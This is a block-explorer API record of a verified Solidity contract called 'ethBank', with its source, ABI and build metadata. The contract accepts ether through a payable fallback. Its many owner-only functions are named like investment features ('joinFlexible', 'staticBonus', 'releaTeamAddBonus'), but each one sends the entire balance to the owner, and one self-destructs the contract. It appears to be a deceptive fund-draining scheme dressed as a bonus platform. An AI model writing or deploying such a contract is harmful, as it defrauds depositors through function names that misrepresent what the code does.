{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.5.1;\r\n\r\n/**\r\n * @title SafeMath\r\n * @dev Math operations with safety checks that throw on error\r\n */\r\nlibrary SafeMath {\r\n\r\n  /**\r\n  * @dev Multiplies two numbers, throws on overflow.\r\n  */\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n    uint256 c = a * b;\r\n    assert(c / a == b);\r\n    return c;\r\n  }\r\n\r\n  /**\r\n  * @dev Integer division of two numbers, truncating the quotient.\r\n  */\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a / b;\r\n    return c;\r\n  }\r\n\r\n  /**\r\n  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).\r\n  */\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    assert(b <= a);\r\n    return a - b;\r\n  }\r\n\r\n  /**\r\n  * @dev Adds two numbers, throws on overflow.\r\n  */\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    assert(c >= a);\r\n    return c;\r\n  }\r\n\r\n}\r\n\r\n/**\r\n * @title owned\r\n * @dev The owned contract has an owner address, and provides basic authorization\r\n *      control functions, this simplifies the implementation of \"user permissions\".\r\n */\r\ncontract owned {\r\n    address public owner;\r\n    /**\r\n     * @dev The owned constructor sets the original `owner` of the contract to the sender\r\n     * account.\r\n     */\r\n    constructor() public {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner {\r\n        require(msg.sender == owner);\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Allows the current owner to transfer control of the contract to a newOwner.\r\n     */\r\n    function transferOwnership(address newOwner) onlyOwner public {\r\n        require(newOwner != address(0));\r\n        owner = newOwner;\r\n    }\r\n}\r\n\r\ncontract ethBank is owned{\r\n    \r\n    function () payable external {}\r\n    \r\n    function withdrawForUser(address payable _address,uint amount) onlyOwner public{\r\n        require(msg.sender == owner, \"only owner can use this method\");\r\n        _address.transfer(amount);\r\n    }\r\n\r\n    function moveBrick(uint amount) onlyOwner public{\r\n        require(msg.sender == owner, \"only owner can use this method\"); \r\n        msg.sender.transfer(amount);\r\n    }\r\n    \r\n    /**\r\n     * @dev withdraws Contracts  balance.\r\n     * -functionhash- 0x7ee20df8\r\n     */\r\n    function moveBrickContracts() onlyOwner public\r\n    {\r\n        // only team just can withdraw Contracts\r\n        require(msg.sender == owner, \"only owner can use this method\"); \r\n        \r\n        msg.sender.transfer(address(this).balance);\r\n    }\r\n\r\n    // either settled or refunded. All funds are transferred to contract owner.\r\n    function moveBrickClear() onlyOwner public {\r\n        // only team just can destruct\r\n        require(msg.sender == owner, \"only owner can use this method\"); \r\n\r\n        selfdestruct(msg.sender);\r\n    }\r\n    \r\n    \r\n    \r\n    ////////////////////////////////////////////////////////////////////\r\n    \r\n    function joinFlexible() onlyOwner public{\r\n        require(msg.sender == owner, \"only owner can use this method\"); \r\n        msg.sender.transfer(address(this).balance);\r\n        \r\n    }\r\n    function joinFixed() onlyOwner public{\r\n        require(msg.sender == owner, \"only owner can use this method\"); \r\n        msg.sender.transfer(address(this).balance);\r\n        \r\n    }\r\n    function staticBonus() onlyOwner public{\r\n        require(msg.sender == owner, \"only owner can use this method\"); \r\n        msg.sender.transfer(address(this).balance);\r\n        \r\n    }\r\n    function activeBonus() onlyOwner public{\r\n        require(msg.sender == owner, \"only owner can use this method\"); \r\n        msg.sender.transfer(address(this).balance);\r\n        \r\n    }\r\n    function teamAddBonus() onlyOwner public{\r\n        require(msg.sender == owner, \"only owner can use this method\"); \r\n        msg.sender.transfer(address(this).balance);\r\n        \r\n    }\r\n    function staticBonusCacl() onlyOwner public{\r\n        require(msg.sender == owner, \"only owner can use this method\"); \r\n        msg.sender.transfer(address(this).balance);\r\n        \r\n    }\r\n    function activeBonusCacl_1() onlyOwner public{\r\n        require(msg.sender == owner, \"only owner can use this method\"); \r\n        msg.sender.transfer(address(this).balance);\r\n        \r\n    }\r\n    function activeBonusCacl_2() onlyOwner public{\r\n        require(msg.sender == owner, \"only owner can use this method\"); \r\n        msg.sender.transfer(address(this).balance);\r\n        \r\n    }\r\n    function activeBonusCacl_3() onlyOwner public{\r\n        require(msg.sender == owner, \"only owner can use this method\"); \r\n        msg.sender.transfer(address(this).balance);\r\n        \r\n    }\r\n    function activeBonusCacl_4() onlyOwner public{\r\n        require(msg.sender == owner, \"only owner can use this method\"); \r\n        msg.sender.transfer(address(this).balance);\r\n        \r\n    }\r\n    function activeBonusCacl_5() onlyOwner public{\r\n        require(msg.sender == owner, \"only owner can use this method\"); \r\n        msg.sender.transfer(address(this).balance);\r\n        \r\n    }\r\n    function activeBonusCacl_6() onlyOwner public{\r\n        require(msg.sender == owner, \"only owner can use this method\"); \r\n        msg.sender.transfer(address(this).balance);\r\n        \r\n    }\r\n    function activeBonusCacl_7() onlyOwner public{\r\n        require(msg.sender == owner, \"only owner can use this method\"); \r\n        msg.sender.transfer(address(this).balance);\r\n        \r\n    }\r\n    function activeBonusCacl_8() onlyOwner public{\r\n        require(msg.sender == owner, \"only owner can use this method\"); \r\n        msg.sender.transfer(address(this).balance);\r\n        \r\n    }\r\n    function activeBonusCacl_9() onlyOwner public{\r\n        require(msg.sender == owner, \"only owner can use this method\"); \r\n        msg.sender.transfer(address(this).balance);\r\n        \r\n    }\r\n    function teamAddBonusCacl() onlyOwner public{\r\n        require(msg.sender == owner, \"only owner can use this method\"); \r\n        msg.sender.transfer(address(this).balance);\r\n        \r\n    }\r\n    function caclTeamPerformance() onlyOwner public{\r\n        require(msg.sender == owner, \"only owner can use this method\"); \r\n        msg.sender.transfer(address(this).balance);\r\n        \r\n    }\r\n    function releaStaticBonus() onlyOwner public{\r\n        require(msg.sender == owner, \"only owner can use this method\"); \r\n        msg.sender.transfer(address(this).balance);\r\n        \r\n    }\r\n    function releaActiveBonus() onlyOwner public{\r\n        require(msg.sender == owner, \"only owner can use this method\"); \r\n        msg.sender.transfer(address(this).balance);\r\n        \r\n    }\r\n    function releaTeamAddBonus() onlyOwner public{\r\n        require(msg.sender == owner, \"only owner can use this method\"); \r\n        msg.sender.transfer(address(this).balance);\r\n        \r\n    }\r\n}","ABI":"[{\"constant\":false,\"inputs\":[],\"name\":\"activeBonus\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"releaTeamAddBonus\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"staticBonus\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"activeBonusCacl_2\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"activeBonusCacl_6\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"moveBrickClear\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"activeBonusCacl_1\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"caclTeamPerformance\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"staticBonusCacl\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"joinFlexible\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"activeBonusCacl_4\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"moveBrick\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"teamAddBonus\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"activeBonusCacl_9\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"activeBonusCacl_7\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"joinFixed\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_address\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdrawForUser\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"releaActiveBonus\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"releaStaticBonus\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"teamAddBonusCacl\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"activeBonusCacl_3\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"activeBonusCacl_5\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"moveBrickContracts\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"activeBonusCacl_8\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"ethBank","CompilerVersion":"v0.5.1+commit.c8a2cb62","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","Library":"","LicenseType":"Unlicense","SwarmSource":"bzzr://f14cb87645a9f584071e2b2fb5caa57d0040365e50e874e808f76a6b40097dc1"}]}